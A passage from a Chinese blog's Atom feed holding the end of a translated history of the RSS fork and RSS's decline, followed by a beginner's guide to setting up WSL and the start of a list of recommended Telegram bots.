<blockquote>
<p>我仍在思考如何使 RSS 继续发展。我当然想要在 RSS2 中使用 冰一样的东西，发布与订阅在我的列表顶部，但我将竭力维护简单性。我喜欢可选的元素。我不想走命名空间与提要的老路，或者试着把它变成 RDF 的一种方言。我理解某些人想要这样，因此我猜我们走到了一个分岔点。我对另一条路将会走向何方有着自己的见解，但至少在现在我不会将这些公之于众。<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup></p>
</blockquote>
<p>一起反对 Winer 的是其他几个人，包括 O&rsquo;Reilly 的 Rael Dornfest，Ian Davis（一家名为 Calaba 的搜索初创企业的负责人），与一位早熟的 14 岁少年 Aaron Swartz，他们都认为 RSS 需要命名空间以容纳大家想要用它处理的许多不同事物。在另一个由 O&rsquo;Reilly 主办的邮件列表中，Davis 提出了一个基于命名空间的模块系统，写道这样一个系统会“使 RSS 比起往过复杂的规范中填充新功能，能像我们想要的那样可扩展”。<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup> “命名空间阵营”相信 RSS 很快会比起作为博客文章聚合，能被用的更多，所以命名空间不是成为并发症，而是保持 RSS 在处理越来越多的情况时保持可被管理的唯一办法。</p>
<p>关于命名空间的争论，其根源在于 RSS 究竟为何这一问题更深层面的意见不一。Winer 为了同步聚合他博客的博文而创造了他的 Scripting News 格式。Guha 与 Libby 在网景设计了 RSS 并称其为“RDF Site Summary”，因为在他们脑中这是一个在网景的在线门户中以缩略重写一个网站的方法。Davis 在写给 Syndication 邮件列表时解释称他认为 RSS “最初被构思为一个建立迷你站点地图的方法”，现在他和其他人想扩展 RSS “以比起简单的新闻标题包含更多种类的信息，及满足过去十二个月里出现的 RSS 的新应用”。<sup id="fnref:20"><a href="#fn:20" class="footnote-ref" role="doc-noteref">20</a></sup> Winer 写了一篇多刺的回复，陈述称他的 Scripting News 格式事实上是原本的 RSS，而且它已经有了不同的目的。鉴于参与 RSS 开发的大多数人在 RSS 为何被创造一事上意见不合，一个分支看起来是不可避免的。</p>
<p>分支发生在 Dornfest 宣布提出 RSS 1.0 标准并形成 RSS-DEV 工作团队——将会包括 Davis, Swartz 及其他几位但并没有 Winer——以对发表做好准备。在被提出的标准中，RSS 再一次代表“RDF Site Summary”，因为 RDF 已经又被加了回来以代表几个 RSS 元素的元数据属性。这份标准承认了 Winer 的名字，给了他通过他的“传道”推广 RSS 的声誉。<sup id="fnref:21"><a href="#fn:21" class="footnote-ref" role="doc-noteref">21</a></sup> 但它也指出仅仅给 RSS 添加更多的元素而没有通过一个模块系统提供可扩展性——这正是 Winer 所建议的——“牺牲了可扩展性”。这份标准继续为 RSS 定义一个基于 XML 命名空间的模块系统。</p>
<p>Winer 对于 RSS-DEV 工作团队自行霸占了“RSS 1.0”之名非常愤怒。<sup id="fnref:22"><a href="#fn:22" class="footnote-ref" role="doc-noteref">22</a></sup> 在另一个关于分散化的邮件列表中，他将 RSS-DEV 工作团队的作为描述为剽窃。<sup id="fnref:23"><a href="#fn:23" class="footnote-ref" role="doc-noteref">23</a></sup> 聚合邮件列表的其他成员也感觉 RSS-DEV 工作团队在社区就如何发展 RSS 这一问题上达成一致之前不该使用“RSS”的名字。但是工作团队坚持使用这个名字。Dan Brickley，RSS-DEV 工作团队的一个成员，为这个决定辩护称“提议中的 RSS 1.0 绝对是基于原始的 RSS 的愿景，其本身曾有相当的遗产影响了 MCF （一个 RDF 的前身）与相关的规格（CDF 等）”。<sup id="fnref:24"><a href="#fn:24" class="footnote-ref" role="doc-noteref">24</a></sup> 他基本上感觉比起 Winer，RSS 1.0 的努力对 RSS 之名有着更好的声明，因为 RDF 原来就是 RSS 的一部分。RSS-DEV 工作团队在 12 月发布了他们的标准的最终版本。同一个月，Winer 发布了他自己对于 RSS 0.91 的改进，他在 UserLand 网站上将其称为 RSS 0.92。RSS 0.92 对 RSS 做了一些小的可选改进，很快增加的 <code>&lt;enclosure&gt;</code> 标签被大范围用于播客。RSS 有了官方的分支。</p>
<p>我仍不清楚为何没能更好地让 Winer 进入 RSS-DEV 工作团队中。正如工作团队中的人们承认的，他是聚合邮件列表中的一名杰出贡献者，且对 RSS 的流行有着显著的贡献。但 Tim O&rsquo;Reilly，O&rsquo;Reilly 的创始人与 CEO，在一个 UserLand 讨论组中解释道 Winer 或多或少地拒绝了参与：</p>
<blockquote>
<p>一群参与了 RSS 的人聚在一起以思考其未来的演变。Dave 是团队的一部分。当团队的一致意见转向了他不喜欢的方向时，Dave 停止了参与，并将其表现得像是 O&rsquo;Reilly 图谋从他那接管 RSS ，罔顾 O&rsquo;Reilly 的 Rael Dornfest 只是被提议的 RSS 1.0 标准众多作者之一的事实，且作者中的很多人在开发中都有着与 Dave 同等的历史。<sup id="fnref:25"><a href="#fn:25" class="footnote-ref" role="doc-noteref">25</a></sup></p>
</blockquote>
<p>对此，Winer 曾言：</p>
<blockquote>
<p>我在那份声明的两周前碰到了 Dale [Dougherty]，他对于其将被称为 RSS 1.0 的事什么都没说。在其被宣布之前的周五，我与 Rael 通了电话，同样他也没说他们将称之为 RSS 1.0。在其公开宣布时我才知道。</p>
<p>让我问你一个直接的问题。如果证明了那份标准被命名为“RSS 1.0”的计划完全被秘密的完成，没有任何的预先通知或是商议，或者是一个让聚合邮件列表里的成员们同意与否的机会，而且不仅仅是我，你会做什么？</p>
<p>UserLand 为创造、普及与支持 RSS 做了大量的工作。我们离开了，让你们这些家伙拥有了这个名字。这就是高层。如果我想对网络聚合做任何进一步的工作，我必须用一个不同的名字。Tim 为什么又怎么会这样？<sup id="fnref:26"><a href="#fn:26" class="footnote-ref" role="doc-noteref">26</a></sup></p>
</blockquote>
<p>我不能在聚合邮件列表中找到任何在使用 RSS 1.0 名称声明的提议前的讨论。</p>
<p>RSS 在 2003 年将再度分支，当时几位开发者对于 RSS 社区中的争吵感到非常沮丧，于是寻求创造一个全新的格式。这些开发者创造了 Atom，一个废除了 RDF 而拥抱 XML 命名空间的格式。Atom 最终被 <a href="https://tools.ietf.org/html/rfc4287">一个提议的 IETF 标准</a> 所规定。在 Atom 的推行之后，有了三个相竞争的 RSS 版本：Winer 的 RSS 0.92（在 2002 年升级为 RSS 2.0 并被重命名为“Really Simple Syndication”），RSS-DEV 工作团队的 RSS 1.0，以及 Atom。</p>
<h2 id="衰落">衰落</h2>
<p>相竞争的 RSS 标准的增加可能在我会简短讨论的其他方面阻碍了 RSS。但这并没有阻止 RSS 在 2000 年间变得极为流行。2004 年，纽约时报开始用 RSS 提供其新闻摘要并写了一篇文章对外行人解释何为 RSS 与如何使用。<sup id="fnref:27"><a href="#fn:27" class="footnote-ref" role="doc-noteref">27</a></sup> Google Reader，一个最终被数百万人使用的 RSS 聚合器，在 2005 年面世。2013 年，RSS 看起来已足够流行到纽约时报，在其对 Aaron Swartz 的讣告中，称之为“无所不在的”技术。<sup id="fnref:28"><a href="#fn:28" class="footnote-ref" role="doc-noteref">28</a></sup> 一时间，在整个世界三分之一的人都注册了 Facebook 前，RSS 一直是网络上很多人了解最新新闻的渠道。</p>
<p>纽约时报在 2013 年一月发行了 Swartz 的讣告。然而到了那个时候， RSS 事实上已经到了拐点，并在其成为一个鲜为人知的技术之路上渐行渐远。Google Reader 在 2013 年七月被关闭，表面上是因为“在过去几年间”用户数量一直在下降。<sup id="fnref:29"><a href="#fn:29" class="footnote-ref" role="doc-noteref">29</a></sup> 这引出了几篇不同途径的文章宣称 RSS 已死。但多年来人们一直宣称 RSS 已死，甚至在 Google Reader 关闭之前。Steve Gillmor，在 2009 年五月为 TechCrunch 的文章中，建议称“是时候完全离开 RSS 并转向 Twitter 了”因为“RSS 再也不能办成事了”。<sup id="fnref:30"><a href="#fn:30" class="footnote-ref" role="doc-noteref">30</a></sup> 他指出 Twitter 基本上是一个更好的 RSS 资讯，因为它在文章自身之外，能展示给你人们正在想什么。它允许你关注人而非只是频道。Gillmor 告诉他的读者，是时候让 RSS 撤回幕后了。他以鲍勃迪伦的“Forever Young”中的一节结束了文章。</p>
<p>现在，RSS 仍未死亡。但也不像过去那样那么流行了。很多人对 RSS 为何失去了其普及度做出了种种解释。最具说服力的解释可能是 Gillmor 在 2009 年给出的。社交网络，就像 RSS 一样，提供了一个能看到网络上所有最新信息的信息流。社交网络接替了 RSS 仅仅是因为它们是更好的信息流。它们也给所属公司带来了更多的利益。有些人曾指责谷歌，例如，关闭了 Google Reader 以使人们去用 Google+。Google 可能能在 Google+ 上以 Google Reader 无法提供的途径赚钱。Marco Arment，Instapaper 的创始人，于 2013 年在其博客中写道：</p>
<blockquote>
<p>Google Reader 仅仅是 Facebook 发起的战争中最新的伤亡，看起来非常偶然：决定谁来拥有一切的战争。当谷歌事实上“拥有” Google Reader 且能利用其中产生的巨量的新闻与关注度数据，这与他们更重要的 Google+ 策略相冲突：他们需要每个人都通过 Google+ 来阅读与分享一切信息这样他们才能够在广告定位数据，广告收入，增长及关联性上与 Facebook 竞争。<sup id="fnref:31"><a href="#fn:31" class="footnote-ref" role="doc-noteref">31</a></sup></p>
</blockquote>
<p>如此用户与科技公司两者都意识到比起使用 RSS，他们能在使用社交网络时获得更多。</p>
<p>另一个理论则是 RSS 对于普通用户来说一直都太极客了。就连曾急于接受 RSS 并向其读者推广的纽约时报，也在 2006 年抱怨道 RSS 是“电脑极客们”所创造的“对用户极为不友好”的首字母缩略词。<sup id="fnref:32"><a href="#fn:32" class="footnote-ref" role="doc-noteref">32</a></sup> 在 2004 年 RSS 的图标被设计出来之前，像纽约时报一样的网站将他们的 RSS 信息链接到一个标有“XML”的橘色小方块上，显然这只是令人生畏。<sup id="fnref:33"><a href="#fn:33" class="footnote-ref" role="doc-noteref">33</a></sup> 尽管这个标记非常准确，因为点击这个链接会将不幸的用户带到一整页的 XML 代码。<a href="https://twitter.com/mgsiegler/status/311992206716203008">这条非常好的推特</a> 捕获了 RSS 为何消亡的本质。普通人从未对使用 RSS 感到舒适；它从未真正被设计为一个面向消费者的技术且包含了太多的障碍；人们在更好的选择到来时便跳槽走了。</p>
<p>如果有着更长远的发展，RSS 可能能够克服种种局限性。可能 RSS 能以某种方法被扩展以使订阅了相同频道的朋友们能相互同步他们关于某篇文章的想法。但在 RSS 开发者社区被卡在试图达成一致的时候，反之，像 Facebook 一样的公司能够“快速行动”。RSS 大分叉仅仅说明了那样做有多么难。所以如果我们扪心自问 RSS 为什么再也不流行，一个非常好的解释是社交网络取代了它。如果我们扪心自问社交网络为何能够取代它，答案可能是试图使 RSS 成功的人们面临着远比如建立 Facebook 更难的问题。如 Dornfest 在某个时刻给聚合邮件列表写的，“现在它比起序列化更像是政治，远不简单。”<sup id="fnref:34"><a href="#fn:34" class="footnote-ref" role="doc-noteref">34</a></sup></p>
<p>所以现在我们只剩下集中的大量信息。某种程度上，我们 <strong>确实</strong> 有了 Kevin Werbach 在 1999 年预见的聚合互联网。毕竟，《洋葱》是一个依赖通过 Facebook 与推特的出版物，正如《宋飞正传》在其最初的运行后依赖于聚合赚取了数十亿的利润。但是网络上的聚合只出现在极少数频道中，意味着我们中没人能“控制我们的网络形象”，如同 Werbach 描述的那样。发生这种情况的一个原因是企业普遍的贪婪——RSS 作为一个开放格式，不能使科技公司控制数据及他们所需要的广告观看者，所以他们不支持它。但更为普通的原因是集中存储比起共同标准更易设计。共识非常难以达到，这也需要时间，但没有共识被拒绝的开发者将会离开并创造相竞争的标准。这给我们的教训可能是如果我们想要看见一个更好、更开放的网络，我们必须在不强迫对方之上做的更好。</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Kevin Werbach, “The Web Goes into Syndication,” Release 1.0, July 22, 1999, 1, accessed September 14, 2018, <a href="http://cdn.oreillystatic.com/radar/r1/07-99.pdf">http://cdn.oreillystatic.com/radar/r1/07-99.pdf</a>.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>ibid.（同上）&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Werbach, 8.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Peter Wiggin, “RSS Delivers the XML Promise,” Web Review, October 29, 1999, accessed September 14, 2018, <a href="https://people.apache.org/~jim/NewArchitect/webrevu/1999/10_29/webauthors/10_29_99_2a.html">https://people.apache.org/~jim/NewArchitect/webrevu/1999/10_29/webauthors/10_29_99_2a.html</a>.&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>Ben Hammersley, RSS and Atom (O’Reilly), 8, accessed September 14, 2018, <a href="https://books.google.com/books?id=kwJVAgAAQBAJ">https://books.google.com/books?id=kwJVAgAAQBAJ</a>.&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>“RSS 0.90 Specification,” RSS Advisory Board, accessed September 14, 2018, <a href="http://www.rssboard.org/rss-0-9-0">http://www.rssboard.org/rss-0-9-0</a>.&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>“My Netscape Network Future Directions,” RSS Advisory Board, accessed September 14, 2018, <a href="http://www.rssboard.org/mnn-futures">http://www.rssboard.org/mnn-futures</a>.&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>Tim Bray, “The RDF.net Challenge,” Ongoing by Tim Bray, May 21, 2003, accessed September 14, 2018, <a href="https://www.tbray.org/ongoing/When/200x/2003/05/21/RDFNet">https://www.tbray.org/ongoing/When/200x/2003/05/21/RDFNet</a>.&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>Dan Libby, “RSS: Introducing Myself,” August 24, 2000, RSS-DEV Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/rss-dev/conversations/topics/239">https://groups.yahoo.com/neo/groups/rss-dev/conversations/topics/239</a>.&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>Alexandra Krasne, “Browser Wars May Become Portal Wars,” CNN, accessed September 14, 2018, <a href="http://www.cnn.com/TECH/computing/9910/04/portal.war.idg/index.html">http://www.cnn.com/TECH/computing/9910/04/portal.war.idg/index.html</a>.&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>Dave Winer, “Scripting News in XML,” Scripting News, December 15, 1997, accessed September 14, 2018, <a href="http://scripting.com/davenet/1997/12/15/scriptingNewsInXML.html">http://scripting.com/davenet/1997/12/15/scriptingNewsInXML.html</a>.&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>Dave Winer, “A Faceoff with Netscape,” Scripting News, June 16, 1999, accessed September 14, 2018, <a href="http://scripting.com/davenet/1999/06/16/aFaceOffWithNetscape.html">http://scripting.com/davenet/1999/06/16/aFaceOffWithNetscape.html</a>.&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>ibid.&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:14">
<p>Dan Libby, “RSS 0.91 Specification (Netscape),” RSS Advisory Board, accessed September 14, 2018, <a href="http://www.rssboard.org/rss-0-9-1-netscape">http://www.rssboard.org/rss-0-9-1-netscape</a>.&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:15">
<p>Dave Winer, “Scripting News: 7/28/1999,” Scripting News, July 28, 1999, accessed September 14, 2018, <a href="http://scripting.com/1999/07/28.html">http://scripting.com/1999/07/28.html</a>.&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:16">
<p>Oliver Willis, “RSS Aggregators?” June 19, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/topics/173">https://groups.yahoo.com/neo/groups/syndication/conversations/topics/173</a>.&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:17">
<p>Dave Winer, “Scripting News: 07/07/2000,” Scripting News, July 07, 2000, accessed September 14, 2018, <a href="http://essaysfromexodus.scripting.com/backissues/2000/06/07/#rss">http://essaysfromexodus.scripting.com/backissues/2000/06/07/#rss</a>.&#160;<a href="#fnref:17" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:18">
<p>Dave Winer, “Re: RSS 0.91 Restarted,” June 9, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/topics/132">https://groups.yahoo.com/neo/groups/syndication/conversations/topics/132</a>.&#160;<a href="#fnref:18" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:19">
<p>Leigh Dodds, “RSS Modularization,” XML.com, July 5, 2000, accessed September 14, 2018, <a href="http://www.xml.com/pub/a/2000/07/05/deviant/rss.html">http://www.xml.com/pub/a/2000/07/05/deviant/rss.html</a>.&#160;<a href="#fnref:19" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:20">
<p>Ian Davis, “Re: [syndication] RSS Modularization Demonstration,” June 28, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/topics/188">https://groups.yahoo.com/neo/groups/syndication/conversations/topics/188</a>.&#160;<a href="#fnref:20" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:21">
<p>“RDF Site Summary (RSS) 1.0,” December 09, 2000, accessed September 14, 2018, <a href="http://web.resource.org/rss/1.0/spec">http://web.resource.org/rss/1.0/spec</a>.&#160;<a href="#fnref:21" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:22">
<p>Dave Winer, “Re: [syndication] Re: Thoughts, Questions, and Issues,” August 16, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/topics/410">https://groups.yahoo.com/neo/groups/syndication/conversations/topics/410</a>.&#160;<a href="#fnref:22" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:23">
<p>Mark Pilgrim, “History of the RSS Fork,” Dive into Mark, September 5, 2002, accessed September 14, 2018, <a href="http://www.diveintomark.link/2002/history-of-the-rss-fork">http://www.diveintomark.link/2002/history-of-the-rss-fork</a>.&#160;<a href="#fnref:23" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:24">
<p>Dan Brickley, “RSS-Classic, RSS 1.0 and a Historical Debt,” November 7, 2000, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/rss-dev/conversations/topics/1136">https://groups.yahoo.com/neo/groups/rss-dev/conversations/topics/1136</a>.&#160;<a href="#fnref:24" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:25">
<p>Tim O’Reilly, “Re: Asking Tim,” UserLand, September 20, 2000, accessed September 14, 2018, <a href="http://static.userland.com/userLandDiscussArchive/msg021537.html">http://static.userland.com/userLandDiscussArchive/msg021537.html</a>.&#160;<a href="#fnref:25" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:26">
<p>Dave Winer, “Re: Asking Tim,” UserLand, September 20, 2000, accessed September 14, 2018, <a href="http://static.userland.com/userLandDiscussArchive/msg021560.html">http://static.userland.com/userLandDiscussArchive/msg021560.html</a>.&#160;<a href="#fnref:26" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:27">
<p>John Quain, “BASICS; Fine-Tuning Your Filter for Online Information,” The New York Times, 2004, accessed September 14, 2018, <a href="https://www.nytimes.com/2004/06/03/technology/basics-fine-tuning-your-filter-for-online-information.html">https://www.nytimes.com/2004/06/03/technology/basics-fine-tuning-your-filter-for-online-information.html</a>.&#160;<a href="#fnref:27" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:28">
<p>John Schwartz, “Aaron Swartz, Internet Activist, Dies at 26,” The New York Times, January 12, 2013, accessed September 14, 2018, <a href="https://www.nytimes.com/2013/01/13/technology/aaron-swartz-internet-activist-dies-at-26.html">https://www.nytimes.com/2013/01/13/technology/aaron-swartz-internet-activist-dies-at-26.html</a>.&#160;<a href="#fnref:28" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:29">
<p>“A Second Spring of Cleaning,” Official Google Blog, March 13, 2013, accessed September 14, 2018, <a href="https://googleblog.blogspot.com/2013/03/a-second-spring-of-cleaning.html">https://googleblog.blogspot.com/2013/03/a-second-spring-of-cleaning.html</a>.&#160;<a href="#fnref:29" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:30">
<p>Steve Gillmor, “Rest in Peace, RSS,” TechCrunch, May 5, 2009, accessed September 14, 2018, <a href="https://techcrunch.com/2009/05/05/rest-in-peace-rss/">https://techcrunch.com/2009/05/05/rest-in-peace-rss/</a>.&#160;<a href="#fnref:30" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:31">
<p>Marco Arment, “Lockdown,” Marco.org, July 3, 2013, accessed September 14, 2018, <a href="https://marco.org/2013/07/03/lockdown">https://marco.org/2013/07/03/lockdown</a>.&#160;<a href="#fnref:31" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:32">
<p>Bob Tedeschi, “There’s a Popular New Code for Deals: RSS,” The New York Times, January 29, 2006, accessed September 14, 2018, <a href="https://www.nytimes.com/2006/01/29/travel/theres-a-popular-new-code-for-deals-rss.html">https://www.nytimes.com/2006/01/29/travel/theres-a-popular-new-code-for-deals-rss.html</a>.&#160;<a href="#fnref:32" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:33">
<p>“NYTimes.com RSS Feeds,” The New York Times, accessed September 14, 2018, <a href="https://web.archive.org/web/20050326065348/www.nytimes.com/services/xml/rss/index.html">https://web.archive.org/web/20050326065348/www.nytimes.com/services/xml/rss/index.html</a>.&#160;<a href="#fnref:33" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:34">
<p>Rael Dornfest, “RE: Re: [syndication] RE: RFC: Clearing Confusion for RSS, Agreement for Forward Motion,” May 31, 2001, Syndication Mailing List, accessed September 14, 2018, <a href="https://groups.yahoo.com/neo/groups/syndication/conversations/messages/1717">https://groups.yahoo.com/neo/groups/syndication/conversations/messages/1717</a>.&#160;<a href="#fnref:34" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content><category scheme="https://blog.batkiz.com/tags/%E7%BF%BB%E8%AF%91" term="%E7%BF%BB%E8%AF%91" label="翻译"/><category scheme="https://blog.batkiz.com/tags/rss" term="rss" label="RSS"/></entry><entry><title type="html">wsl 使用指北</title><link href="https://blog.batkiz.com/posts/using-wsl/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/solving-cmder-space/?utm_source=atom_feed" rel="related" type="text/html" title="解决 cmder 光标问题"/><link href="https://blog.batkiz.com/posts/how-to-play-minecrafet-with-xbox-controller/?utm_source=atom_feed" rel="related" type="text/html" title="如何使用Xbox手柄玩Minecraft"/><link href="https://blog.batkiz.com/posts/install-linux-in-upan/?utm_source=atom_feed" rel="related" type="text/html" title="将linux装入u盘之路"/><link href="https://blog.batkiz.com/posts/software-on-my-computer/?utm_source=atom_feed" rel="related" type="text/html" title="我的电脑软件"/><id>https://blog.batkiz.com/posts/using-wsl/</id><published>2018-10-06T16:59:37+00:00</published><updated>2018-10-06T16:59:37+00:00</updated><content type="html"><![CDATA[<blockquote>MICROSOFT 已成最大 Linux 发行版（</blockquote><p>经由多个版本更新，现在 wsl 对于普通开发工作已基本没啥问题了，已可基本抛弃虚拟机（</p>
<blockquote>
<p>注：由于 wsl 实现方式是自己实现了一遍 Linux Kernel<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>，因此涉及 Linux 底层（内核、hack 等）的东西基本还是不行的。。</p>
</blockquote>
<h2 id="简明入坑教程">简明入坑教程</h2>
<h3 id="安装">安装</h3>
<ol>
<li>进入设置，在 <strong>更新与安全 -&gt; 开发者选项</strong> 中打开开发人员模式</li>
<li>直接使用 Cortana 搜索 <strong>Windows 功能</strong>，在 <strong>启用或关闭 Window 功能</strong> 中勾选打开 <em>适用于 Linux 的 Windows 子系统</em></li>
<li>进入 microsoft store，搜索 <em>Linux</em>，挑一个顺眼的发行版安装<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></li>
<li>待安装完成后打开该发行版的 shell，然后设置用户名与密码</li>
</ol>
<h3 id="提升体验">提升体验</h3>
<ul>
<li><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu//">换源</a> 是必须的</li>
<li>安装 build-essential, zsh, vim 等并配置</li>
</ul>
<h3 id="wsl-terminal">wsl-terminal</h3>
<p>wsl-terminal 是 「用于 Windows Subsystem for Linux (WSL) 的终端模拟器，基于 <a href="http://mintty.github.io/">mintty</a>、<a href="https://github.com/paolo-sz/fatty">fatty</a> 和 <a href="https://github.com/rprichard/wslbridge">wslbridge</a>。」，解决了很多默认终端里存在的问题，建议 wsl 用户都来下载使用这个。</p>
<p>基本配置其实看看文档都能理解，不过我还是想推荐几个功能：</p>
<ul>
<li>运行 <code>tools/1-add-open-wsl-terminal-here-menu.js</code> (<a href="https://github.com/goreliu/wsl-terminal/blob/master/README.zh_CN.md#%E5%B7%A5%E5%85%B7">帮助</a>) 来添加一个 <code>Open wsl-terminal Here</code> 右键菜单到资源管理器上。</li>
<li>配置文件 <code>etc/wsl-terminal.conf</code> 中可将默认 shell 改为 zsh。</li>
</ul>
<h2 id="tips">tips</h2>
<h3 id="关于-wsl-terminal">关于 wsl-terminal</h3>
<ul>
<li>推荐背景色 <code>40, 44, 52</code>（我从 vscode 的 one dark pro 主题那偷来的）</li>
<li>建议在 <code>windows</code> 上安装 <a href="https://github.com/powerline/fonts">powerline fonts</a> 以提升使用体验</li>
</ul>
<h3 id="关于-linux">关于 linux</h3>
<ul>
<li>人生苦短，来用 zsh</li>
<li>zsh 主题强烈推荐 ys</li>
<li>人生苦短，尽量别碰 vim</li>
<li>真想碰的话来试试<a href="https://github.com/batkiz/k-vim">我的配置</a></li>
</ul>
<h3 id="关于-wsl">关于 wsl</h3>
<ul>
<li>当终端用就好，别再整些什么 X-server 之类的搞 GUI</li>
<li>功能仍然有限，该用虚拟机就早点上虚拟机</li>
<li>推荐 <a href="https://system76.com/pop">Pop!_os</a>，自带中文输入法已经贼好看的主题与壁纸，你还在等什么！</li>
<li>记得有个 GitHub repo 是有不少软件的可用性测试的，不过我懒得找了，有需要的可以找找看。</li>
</ul>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://www.zhihu.com/question/54896787">https://www.zhihu.com/question/54896787</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>我选择 <code>Ubuntu</code>，不带版本号的那个。&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content><category scheme="https://blog.batkiz.com/tags/linux" term="linux" label="linux"/><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="windows"/></entry><entry><title type="html">telegram bots 推荐</title><link href="https://blog.batkiz.com/posts/useful-telegram-bots/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/useful-telegram-bots/</id><published>2018-07-30T14:46:56+00:00</published><updated>2018-07-30T14:46:56+00:00</updated><content type="html"><![CDATA[<p>telegram 作为一个新兴的 IM 软件，开源、安全等诸多特性都在吸引着人们来使用 telegram。
同样，bots 也是 telegram 不可或缺的一部分（误，下面我会推荐一些好用的 bot。
注：inline bot 即为在聊天框可直接敲入 <code>@username</code> 来调用的 bot。</p>
<h2 id="图片相关">图片相关</h2>
<ol>
<li><code>@bing</code> 与 <code>@pic</code> 作为 inline bot 均可用于搜索图片，直接在聊天框发出。</li>
<li>你可以给 <code>@asciiart_bot</code> 发送一张图片，然后其会返回给你该图片的字符画版本。</li>
<li><code>@youqianbot</code> 与 <code>@wangjingze_bot</code> 分别为“为所欲为”与“王境泽”表情包的生成器，用于生成 gif 表情。</li>
<li><code>@LatexBot</code> 可以输入 <code>LaTeX</code> 公式生成公式的图，亦可 inline 调用。</li>
<li>可以给 <code>@WhatAnimeBot</code> 发送任意动漫的截图，以获得该图片详细信息（如番名，哪一集的什么时间）。</li>
